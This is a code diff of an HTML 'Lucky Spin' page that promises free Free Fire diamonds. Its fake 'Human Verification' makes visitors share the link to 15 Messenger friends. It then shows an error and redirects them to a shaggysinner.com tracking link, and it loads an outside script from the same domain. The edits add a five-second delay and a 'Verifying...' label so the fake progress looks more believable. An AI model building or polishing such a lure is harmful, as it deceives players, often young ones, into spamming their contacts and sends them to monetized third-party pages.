@@ -138,7 +138,7 @@
 
     <div id="main-container">
         <h2>💎 Lucky Spin 💎</h2>
-        <p style="color: #7f8c8d; font-size: 14px;">Win Free Fire Diamonds Instantly</p>
+        <p style="color: #7f8c8d; font-size: 14px;">Win <b>Free Fire</b> Diamonds Instantly</p>
 
         <div style="position: relative; width: 250px; height: 250px; margin: 20px auto;">
             <div style="position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #e74c3c; z-index: 10;"></div>
@@ -156,7 +156,7 @@
 
         <div id="share-section" style="display:none;">
             <p style="font-weight: bold; margin-bottom: 5px;">Human Verification</p>
-            <p style="font-size: 12px; color: #666;">Share with 15 Friends or 5 Groups on Messenger to complete.</p>
+            <p style="font-size: 12px; color: #666;">Share with 15 Friends or 5 Groups on Messenger to complete for <b>Free Fire</b>.</p>
             
             <div class="progress-container">
                 <div id="percent-text">0%</div>
@@ -164,7 +164,7 @@
             </div>
             
             <p id="share-count" style="font-size: 14px; margin-top: 5px;">Share Progress: <span id="count-num">0</span>/15</p>
-            <button class="btn-share" onclick="shareToFriends()">SEND ON MESSENGER</button>
+            <button id="share-btn" class="btn-share" onclick="shareToFriends()">SEND ON MESSENGER</button>
         </div>
 
         <div id="error-section">
@@ -193,7 +193,7 @@ const segments = ["1000 💎", "5000 💎", "2500 💎", "10000 💎", "500 💎
 const colors = ["#1abc9c", "#3498db", "#e74c3c", "#f1c40f", "#9b59b6", "#e67e22"];
 let currentRotation = 0;
 let shareClicks = 0;
-const totalNeeded = 15; // Set to 15 shares
+const totalNeeded = 15; 
 
 function drawWheel() {
     const sliceAngle = (2 * Math.PI) / segments.length;
@@ -234,30 +234,36 @@ function redeem() {
 }
 
 function shareToFriends() {
-    shareClicks++;
+    const shareBtn = document.getElementById('share-btn');
+    shareBtn.disabled = true;
+    shareBtn.innerText = "Verifying...";
     
-    // Percentage Calculation
-    let percentage = Math.floor((shareClicks / totalNeeded) * 100);
-    if (percentage > 100) percentage = 100;
-
-    // Update Progress UI
-    document.getElementById('progress-bar').style.width = percentage + "%";
-    document.getElementById('percent-text').innerText = percentage + "%";
-    document.getElementById('count-num').innerText = shareClicks;
-
-    // Open Messenger
+    // Open Messenger instantly
     window.open("fb-messenger://share/?link=" + encodeURIComponent(window.location.href), "_blank");
 
-    // Check if task complete
-    if (shareClicks >= totalNeeded) {
-        setTimeout(() => {
-            document.getElementById('share-section').style.display = "none";
-            document.getElementById('error-section').style.display = "block";
+    // Delay the progress update by 5 seconds
+    setTimeout(() => {
+        shareClicks++;
+        let percentage = Math.floor((shareClicks / totalNeeded) * 100);
+        if (percentage > 100) percentage = 100;
+
+        document.getElementById('progress-bar').style.width = percentage + "%";
+        document.getElementById('percent-text').innerText = percentage + "%";
+        document.getElementById('count-num').innerText = shareClicks;
+        
+        shareBtn.disabled = false;
+        shareBtn.innerText = "SEND ON MESSENGER";
+
+        if (shareClicks >= totalNeeded) {
             setTimeout(() => {
-                window.location.href = "https://shaggysinner.com/yg0wbpnd?key=c3cf96e449f8239c296a7f20997be98e"; // <-- REPLACE THIS WITH YOUR LINK
-            }, 3000);
-        }, 1000);
-    }
+                document.getElementById('share-section').style.display = "none";
+                document.getElementById('error-section').style.display = "block";
+                setTimeout(() => {
+                    window.location.href = "https://shaggysinner.com/yg0wbpnd?key=c3cf96e449f8239c296a7f20997be98e";
+                }, 3000);
+            }, 1000);
+        }
+    }, 5000); // 5000ms = 5 Seconds
 }
 </script>
 <script src="https://shaggysinner.com/f7/f2/38/f7f238b57caa1a06ba1ed8f121c1ee10.js"></script>
